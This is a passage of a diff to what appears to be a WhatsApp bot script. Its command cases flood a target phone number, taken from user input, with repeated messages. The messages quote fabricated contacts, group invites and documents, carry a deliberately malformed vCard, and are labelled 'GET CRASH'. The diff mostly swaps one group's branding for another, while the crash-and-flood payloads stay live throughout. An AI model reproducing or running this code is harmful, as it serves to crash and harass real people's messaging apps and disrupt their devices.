- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
  await m.reply(`Succes`)
 break 
 case 'gasdeck':
@@ -5872,39 +5652,24 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { "contactMessage": { 
-"displayName": `CXZA 935`,
+"displayName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon})
 await m.reply(`Succes`)
 break
 case 'gasbro':
@@ -5919,9 +5684,8 @@ participant: `0@s.whatsapp.net`,
 "groupInviteMessage": {
 "groupJid": "6288213840883-1616169743@g.us",
 "inviteCode": `ith6ffr68`,
-"groupName": `CXZA 935`, 
-"caption": `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇`, 
+"groupName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`, 
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`, 
 'jpegThumbnail': thumb
 }
 }
@@ -5952,71 +5716,41 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`, 
+title: `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 } 
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
